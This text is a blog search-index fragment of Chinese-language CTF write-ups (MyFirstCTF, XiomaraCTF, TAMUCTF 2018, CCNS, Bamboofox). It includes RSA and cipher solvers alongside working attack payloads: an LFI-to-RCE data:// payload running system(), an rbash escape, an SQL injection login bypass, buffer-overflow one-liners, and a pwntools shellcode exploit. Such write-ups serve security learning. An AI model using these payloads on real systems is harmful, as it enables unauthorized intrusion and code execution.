class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">2017年2月23日google在底下網址宣稱已經成功攻破sha1</span><br><span class="line">https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html</span><br><span class="line"></span><br><span class="line">你知道這會有甚麼問題嗎？</span><br><span class="line"></span><br><span class="line">題目網址中顯示PHP原始碼使用SHA1函示對使用者輸入的密碼進行hash，請你使用根據sha1 collision原理登入以下網址取得flag:</span><br><span class="line"></span><br><span class="line">請連結以下網址:</span><br><span class="line">http://10.141.0.210:4114/</span><br><span class="line"></span><br><span class="line">提示1:SHA1為美國國家安全局（National Security Agency，NSA）所設計並於1995年發表的加密雜湊函數，隨後亦成為美國聯邦資料處理標準。有關SHA1加密雜湊函數，請參看維基百科的說明:</span><br><span class="line">https://zh.wikipedia.org/wiki/SHA-1</span><br><span class="line">提示2:SHAttered attack的資料請參看</span><br><span class="line">https://shattered.io/</span><br><span class="line"></span><br><span class="line">同樣題型不同比賽：http://120.114.62.45:4114/index.php</span><br><span class="line">教育部架設之另一平台，請勿做非法網路攻擊。</span><br><span class="line">網站可能隨時關站，因為這又不是我架的 (´・ω・`)</span><br></pre></td></tr></table></figure><p>什麼？你以為真的要你碰撞兩組 SHA-1 嗎？</p><p><img src="https://i.imgur.com/goTJBdV.jpg" alt=""></p><p>跟 MD5 collision 一樣，只要找出符合 SHA-1 後是 0e 開頭的資料即可<br>我使用 “10932435112”</p><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RSA加密演算法是著名的非對稱加密演算法，在電子商業中RSA加密被廣泛使用。資安人員在某間公司發現他們的產品使用RSA加密技術時，RSA某些參數設計不夠嚴謹很容易被破解。</span><br><span class="line"></span><br><span class="line">這是你的第一堂RSA破密分析作業。聰明的你能解出明文嗎?</span><br><span class="line"></span><br><span class="line">提示1 :請參看維基百科RSA加密演算法的說明 :</span><br><span class="line">https://en.wikipedia.org/wiki/RSA_(cryptosystem)</span><br><span class="line">當然你可以點選中文解說</span><br><span class="line">提示2：n很小可以先分解出p和q質數。你可以善用線上資源解質因數分解。　</span><br><span class="line">提示3：解出來的明文必須是MyFirstCTF&#123;xxxxxxxxxxx&#125;答案格式。</span><br><span class="line"></span><br><span class="line">https://bit.ly/2EbQ52g</span><br></pre></td></tr></table></figure><p>n 可以直接使用 <a href="http://factordb.com" target="_blank" rel="noopener">factordb.com</a> 解出質數</p><p>以下因為題目遺失，將使用類似題型講解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">23292710978670380403641273270002884747060006568046290011918413375473934024039715180540887338067</span></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line">c = <span class="number">10342881148737891804821388667541809359978248929587283926428086704207154183086620548133548060830</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># p\*q\*r = n</span></span><br><span class="line">p = <span class="number">26440615366395242196516853423447</span></span><br><span class="line">q = <span class="number">27038194053540661979045656526063</span></span><br><span class="line">r = <span class="number">32581479300404876772405716877547</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (q<span class="number">-1</span>)*(p<span class="number">-1</span>)*(r<span class="number">-1</span>))</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Write-up </category>
          
          <category> MyFirstCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyFirstCTF - Write-up </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XiomaraCTF 解題</title>
      <link href="/zh-tw/xiomaractf-2018/"/>
      <content type="html"><![CDATA[<p>HackMD網址：<a href="https://hackmd.io/s/B1grPrzOf" target="_blank" rel="noopener">https://hackmd.io/s/B1grPrzOf</a></p><p>有些水題就不寫writeup了，交給其他人吧 (´・ω・`)</p><h1 id="Crypto-Custom-HEN"><a href="#Crypto-Custom-HEN" class="headerlink" title="Crypto - Custom HEN"></a>Crypto - Custom HEN</h1><p>密文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">082_336_88_167755403</span><br></pre></td></tr></table></figure></p><p>題目跟你說，密文的產生方式是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## encryption</span><br><span class="line">FLAG -&gt; HEN_Cipher -&gt; alphametic puzzle -&gt; CipherText</span><br></pre></td></tr></table></figure></p><p>所以我們只要逆向這個加密過程就好了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## decryption</span><br><span class="line">FLAG &lt;- HEN_Cipher &lt;- alphametic puzzle &lt;- CipherText</span><br></pre></td></tr></table></figure></p><p>先用 <a href="http://www.tkcs-collins.com/truman/alphamet/alpha_solve.shtml" target="_blank" rel="noopener">alphametic puzzle solver</a> 把每個數字代表的英文找出來：</p><p><img src="https://i.imgur.com/I8IEJtQ.png" alt=""></p><p>得到：<br><img src="https://i.imgur.com/aII59cu.png" alt=""></p><p>將密文替換：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">082_336_88_167755403 = CZF_KKU_ZZ_GUYYPPNCK</span><br></pre></td></tr></table></figure></p><p>:::danger<br>HEN的加密模式：<br>左移偏移量 = ((字母的位置) * (字串總長度)) mod 26<br>注意！字串總長度不包含底線！<br>:::</p><p>:::success<br>HEN的解密方法：<br>右移偏移量 = ((字母的位置) * (字串總長度)) mod 26<br>不過首先要解決的就是 ‘A’ 往右偏移1位如何到 ‘Z’<br>:::</p><p>這邊我寫了 python script 作解密，分別算出每個字母的偏移量與明文。</p><p>字母左移的部份我採用 ASCII 來作減法運算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"><span class="comment"># Copyright © 2018 howpwn &lt;finn79426@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ciphertext = <span class="string">'CZFKKUZZGUYYPPNCK'</span> <span class="comment"># remove the "_"</span></span><br><span class="line"></span><br><span class="line">plaintext_size = len(Ciphertext)</span><br><span class="line"></span><br><span class="line">left_move = []</span><br><span class="line">plaintext = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Ciphertext: &#123;0&#125;"</span>.format(Ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Each alphabet left shift is:"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, plaintext_size):</span><br><span class="line">    left_move.append(((i+<span class="number">1</span>) * plaintext_size) % <span class="number">26</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"alphabet[&#123;0&#125;] need &#123;1&#125; step"</span>.format(i+<span class="number">1</span>, left_move[i])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"----------"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Counting the left shift alphabet is what..."</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, plaintext_size):</span><br><span class="line">    temp = ord(Ciphertext[i]) + left_move[i]</span><br><span class="line">    <span class="keyword">if</span> temp &gt; <span class="number">90</span>: <span class="comment"># 如果 temp 大於 ASCII 的 "Z"，我們就必須將它檢掉 26 讓它回到 A 開始繼續往右移</span></span><br><span class="line">        temp -= <span class="number">26</span></span><br><span class="line">    plaintext += chr(temp)</span><br><span class="line">    <span class="keyword">print</span> plaintext</span><br><span class="line"><span class="keyword">print</span> <span class="string">"----------"</span></span><br></pre></td></tr></table></figure><p>(PS:這樣code好亂Orz…我應該用function去實作的…)</p><p>執行完腳本後會得到 “THEARSOFDIDUCTION”，這個時候把底線與FLAG頭加上去就是正確答案了。</p><p>xiomara{THE_ARS_OF_DIDUCTION}</p><h1 id="Crypto-Giveaway"><a href="#Crypto-Giveaway" class="headerlink" title="Crypto - Giveaway"></a>Crypto - Giveaway</h1><p>可以秒解。</p><ol><li>N 太大，factordb不能分解出p、q</li><li>e 很小</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"><span class="comment"># Copyright © 2018 howpwn &lt;finn79426@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">481198641867289038243532927701020249905433964052522187774270437592775342143784702291483427578470414194602731404343532513840453569385856109993166637836189117235549985093499643724363002153995995953731212190003813128852867940536928597102669895224512199695772684398151784349020282852823384810308548307944122748283</span></span><br><span class="line">c = <span class="number">2039130155866184490894181588949291569587424373754875837330412835527276040280846677481047284126316137541961805207979583672570357348995401556991229785828117383170279052532972654304372432603436204862621797</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = iroot(c,e)</span><br><span class="line"><span class="keyword">print</span> n2s(m[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>由於e太小、N太大，導致於：<br>c = $m^{e}$ mod n<br>&nbsp;&nbsp;&nbsp;= $m^{e}$</p><p>也就是說，如果要解密m<br>m = $\sqrt[e] {c}$</p><p>xiomara{4y3_4y3_cryp70_6uy!}</p><h1 id="Web-Flag-Locker"><a href="#Web-Flag-Locker" class="headerlink" title="Web - Flag Locker"></a>Web - Flag Locker</h1><p>這網站有LFI漏洞</p><p>可以用 php://filter 看到該網頁的源碼 (記得base64 decode)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.5.112.91:1234/?locker=php://filter/convert.base64-encode/resource=why</span><br></pre></td></tr></table></figure><p>不過依然找不到 FLAG，所以我們必須要能夠 RCE 才能找出FLAG：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.5.112.91:1234/?locker=data://text/plain,&lt;?php system(&quot;ls -al&quot;)?&gt;;</span><br></pre></td></tr></table></figure><p>最後，其實FLAG是在 index.php 裡面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.5.112.91:1234/?locker=data://text/plain,&lt;?php system(&quot;cat index.php&quot;)?&gt;;</span><br></pre></td></tr></table></figure></p><p>xiomara{s0metim3s_fl@g_c@n_b3<em>d3cl@red</em>@s_v@riable}</p>]]></content>
      
      <categories>
          
          <category> Write-up </category>
          
          <category> Xiomara </category>
          
          <category> 2018 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 解題 </tag>
            
            <tag> 筆記 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>TAMUCTF-2018</title>
      <link href="/zh-tw/tamuctf-2018/"/>
      <content type="html"><![CDATA[<p>太多情境題了<br>web 滿滿的水題有點無言<br>只寫一些值得紀錄的</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="you-can-run-you-can-hide-25"><a href="#you-can-run-you-can-hide-25" class="headerlink" title="you can run, you can hide [25]"></a>you can run, you can hide [25]</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find the hidden flag.</span><br><span class="line"></span><br><span class="line">ssh tamuctf@shell1.ctf.tamu.edu -p 2223</span><br><span class="line">password: tamuctf</span><br></pre></td></tr></table></figure><p>ssh 進去之後發現他是用<code>rbash</code>，意外在網路上找到神奇 payload (到現在還不知道原理)<br><code>BASH_CMDS[a]=/bin/sh;a</code><br><a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html" target="_blank" rel="noopener">Source</a></p><p>目錄裡面直接就有flag了<br><code>gigem{TAMU_secret_society_qSD358OUYGcezTlFbqeh}</code></p><p>後面神隊友給了另一個 payload (在看連入的連線的時候發現好像大部分都是這樣連入的)<br><code>ssh tamuctf@shell1.ctf.tamu.edu -p 2223 -t &quot;bash --noprofile&quot;</code></p><h3 id="enum-150"><a href="#enum-150" class="headerlink" title="enum [150]"></a>enum [150]</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Find the hidden flag.</span><br><span class="line">You do not need to bruteforce. Don&apos;t do it.</span><br><span class="line"></span><br><span class="line">ssh tamuctf@shell2.ctf.tamu.edu -p 2222</span><br><span class="line">password: tamuctf</span><br></pre></td></tr></table></figure><p>這題卡很久，最後靠隊友 carry<br>連續前面一題，繞過之後我一開始在<code>/var/backups/</code>找到<code>.srv.bak</code>，裡面放了帳號跟密碼<br>後來就是隊友carry的部分了<br>用<code>ps aux</code>指令發現有一個程序是執行<code>/bin/bash -c /usr/sbin/service ssh restart &amp;&amp; cd /.administrators &amp;&amp; /usr/bin/python /.administrators/pyserver.py 9000</code><br>後來在自己的電腦執行<code>ssh -L 1234:localhost:9000 tamuctf@shell2.ctf.tamu.edu -p 2222</code>(port forwarding)，在自己的瀏覽器開啟<code>localhost:1234</code>再輸入之前找到的帳號密碼就可以得到 flag 了<br><code>gigem{pivot_piv0t_P1V0T_20975430987aff92qf89qf}</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h3><p>只是覆蓋<code>cmp    DWORD PTR [ebp-0xc],0xf007ba11</code>而已</p><p>Payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;a&apos;*23 + &apos;\x11\xba\x07\xf0&apos;&quot; | nc pwn.ctf.tamu.edu 4321</span><br></pre></td></tr></table></figure></p><h3 id="Pwn2"><a href="#Pwn2" class="headerlink" title="Pwn2"></a>Pwn2</h3><p>執行<code>echo</code>函式時，可以 Overflow 跳到<code>print_flag</code></p><p>Payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;a&apos;*243 + &apos;\x4b\x85\x04\x08&apos;&quot; | nc pwn.ctf.tamu.edu 4322</span><br></pre></td></tr></table></figure></p><h3 id="Pwn3"><a href="#Pwn3" class="headerlink" title="Pwn3"></a>Pwn3</h3><p>觀察了一下會發現輸出的 random number 會是 buffer 的起始地址，所以方向就很清楚了 <code>return to shellcode</code></p><p>Payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./pwn3')</span></span><br><span class="line"><span class="comment">#r = remote('0.0.0.0', 8888)</span></span><br><span class="line">r = remote(<span class="string">'pwn.ctf.tamu.edu'</span>, <span class="number">4323</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Your random number '</span>)</span><br><span class="line">addr = int(r.recv(<span class="number">10</span>).strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">'a'</span> * (<span class="number">242</span>-len(shellcode)) + p32(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"><span class="keyword">print</span> p32(addr)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line"><span class="comment">#raw_input('########')</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> Write-up </tag>
            
            <tag> tamuctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CCNS Wargame (Web)</title>
      <link href="/zh-tw/ccns-wargame-web/"/>
      <content type="html"><![CDATA[<h2 id="Log-is-important"><a href="#Log-is-important" class="headerlink" title="Log is important"></a>Log is important</h2><p>看瀏覽器中的輸出資料得知flag<br><code>CCNS{53lf_x55}</code></p><h2 id="Frontend-engineer"><a href="#Frontend-engineer" class="headerlink" title="Frontend engineer"></a>Frontend engineer</h2><p>F12原始碼中 題目註解藏flag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"chal-desc"</span>&gt;</span><span class="tag">&lt;<span class="name">h4</span>&gt;</span>誠徵前端工程師<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>需求：<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>熟悉 html, css<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>無經驗可<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>有寫註解的習慣<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>待遇：<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>５０點<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- CCNS&#123;fr0n73nd_5uck5&#125; --&gt;</span></span><br></pre></td></tr></table></figure><h2 id="妹妹的臉書帳號"><a href="#妹妹的臉書帳號" class="headerlink" title="妹妹的臉書帳號"></a>妹妹的臉書帳號</h2><p>一個登入系統 題目給了username了 直接試著Sqlinjection<br>username: imouto<br>password: ‘or’1’=’1<br>得到flag<br><code>CCNS{YO_HAVE_NO_SISTER}</code></p><h2 id="ㄌㄌㄎ"><a href="#ㄌㄌㄎ" class="headerlink" title="ㄌㄌㄎ"></a>ㄌㄌㄎ</h2><p>從原始碼中得到一串script<br><code>&lt;script src=&quot;source.js&quot;&gt;&lt;/script&gt;</code><br>直接帶入網址<br>得到flag</p><p><code>CCNS{1o1i_5aik0u_87euihkjr484uirhgur48terheirqo34895tur484uirhgur48terhioo43895tyuhieiwo493r89t4uihjefwio4r8uguihererheirqo34pw4uihp49tiueghrulw485tygehur484tugiq34quoireugt82q3pwreuw485tygehur484tugiq34quoireugt82eghpt87tq38ihwergi3uhto8fui3ythow83hp49tiueghrulw485tygehur484tugiq34quoireugt82q3pwreui4rhofw8ueirhfow873uiergtw8o48t7yololiloliloli}</code><br>沒錯 就是那麼長</p>]]></content>
      
      <categories>
          
          <category> Write-up </category>
          
          <category> CCNS </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-up </tag>
            
            <tag> CCNS </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bamboofox CTF 2017</title>
      <link href="/zh-tw/bamboofox2017/"/>
      <content type="html"><![CDATA[<p>過了好幾個月重回了 CTF 比賽，但是這次考的是我以前沒學過的 x64 再加上我完全忘記要如何解題，變得 pwn 只拿下一題，挺失望的 QQ</p><p><code>這裡就不分享 FLAG 了，只會寫出解法(也沒幾題QQ</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="suck-browser"><a href="#suck-browser" class="headerlink" title="suck-browser"></a>suck-browser</h3><p>又是個 <code>302</code> 的坑，用 <code>curl</code> 就可以停止自動跳轉</p><h3 id="suck-apple"><a href="#suck-apple" class="headerlink" title="suck-apple"></a>suck-apple</h3><p>一個時事梗，只用 <code>root</code> 當作用戶名，不需要密碼即可有 <code>root</code> 權限</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="suck-login"><a href="#suck-login" class="headerlink" title="suck-login"></a>suck-login</h3><p>Description:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">There is a suck login page and I found the md5 hash password is 0e836584205638841937695747769655.</span><br><span class="line"></span><br><span class="line">Can you crack it?!</span><br></pre></td></tr></table></figure></p><p>題目有提示 <code>hash(密碼)</code> 是 <code>0e</code> 開頭的，就可以聯想到是 php 會自動轉形態的問題，<br>因為 php 會自動把密碼的雜湊值轉成科學記號，變成0<br>所以密碼只要再找一組雜湊值一樣為0的就可以得到 FLAG</p><h3 id="tiny-git"><a href="#tiny-git" class="headerlink" title="tiny-git"></a>tiny-git</h3><p>看到題目，一開始就先看 <code>/.git/</code> 資料夾，發現會返回 <code>403 Forbidden</code>，<br>利用 <code>Denny</code> 大大的 Sctipt <a href="https://github.com/denny0223/scrabble" target="_blank" rel="noopener">(Link)</a><br>可以發現檔案依舊可以下載，但是子目錄的檔案因為會返回 403<br>所以沒辦法瞭解內部檔案狀況<br>這時候就要科普一下 git 的儲存方式<br><a href="https://www.siteground.com/tutorials/git/directory-structure/" target="_blank" rel="noopener">對於 git 的小解釋</a><br>在找到 log 之後發現他直接在 commit messege 裡面寫上 FLAG</p><h2 id="pwn-最遺憾的一個類別"><a href="#pwn-最遺憾的一個類別" class="headerlink" title="pwn (最遺憾的一個類別)"></a>pwn (最遺憾的一個類別)</h2><h3 id="water-impossible"><a href="#water-impossible" class="headerlink" title="water-impossible"></a>water-impossible</h3><p>在題目有給了原始碼和 binary，在原始碼看到如果 <code>(int token) == 6666</code><br>這個檢查有過，就會噴 FLAG<br>(保護只有開 NX)</p><p>所以利用 cyclic 確定可以蓋到 token ，並且知道 offset 是 28，所以<br>Payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>, <span class="number">58799</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">28</span> + <span class="number">0x00001a0a</span></span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><p>Rank: 21 (6l0ry)</p>]]></content>
      
      <categories>
          
          <category> Write-up </category>
          
          <category> Bamboofox </category>
          
          <category> 2017 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-up </tag>
            
            <tag> bamboofox </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
